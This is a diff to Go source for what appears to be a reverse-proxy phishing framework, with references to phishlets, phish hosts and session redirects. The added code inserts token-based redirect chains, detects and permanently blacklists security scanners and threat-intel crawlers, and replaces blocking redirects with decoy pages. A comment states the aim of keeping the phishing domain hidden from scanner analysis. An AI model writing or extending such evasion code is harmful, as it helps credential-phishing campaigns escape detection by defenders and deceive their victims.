@@ -182,12 +182,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Multi-layer redirect chain hops (/c/<token>).
+			// Must run before bot-check so chain links work for real users.
+			if handled, rq, rs := handleRedirectChainRequest(req, p.cfg.GetRedirectChainSecret()); handled {
+				return rq, rs
+			}
+
+			// Anti-bot: detect scanners/threat-intel crawlers before anything else.
+			// Permanently blacklists the IP+subnet and returns a clean decoy page.
+			if isBot, rq, rs := CheckAndBlockBot(req, from_ip, p.bl); isBot {
+				return rq, rs
+			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
 						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 					}
-					return p.blockRequest(req)
+					return DecoyResponse(req)
 				}
 				if p.cfg.GetBlacklistMode() == "all" {
 					if !p.bl.IsWhitelisted(from_ip) {
@@ -201,7 +213,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 
-					return p.blockRequest(req)
+					return DecoyResponse(req)
 				}
 			}
 
@@ -1273,23 +1285,9 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
-	var redirect_url string
-	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
-		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
-	}
-	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
-		redirect_url = p.cfg.general.UnauthUrl
-	}
-
-	if redirect_url != "" {
-		return p.javascriptRedirect(req, redirect_url)
-	} else {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
-		if resp != nil {
-			return req, resp
-		}
-	}
-	return req, nil
+	// Always serve a clean decoy page — never a redirect.
+	// Redirects expose the phishing domain to scanner follow-through analysis.
+	return DecoyResponse(req)
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
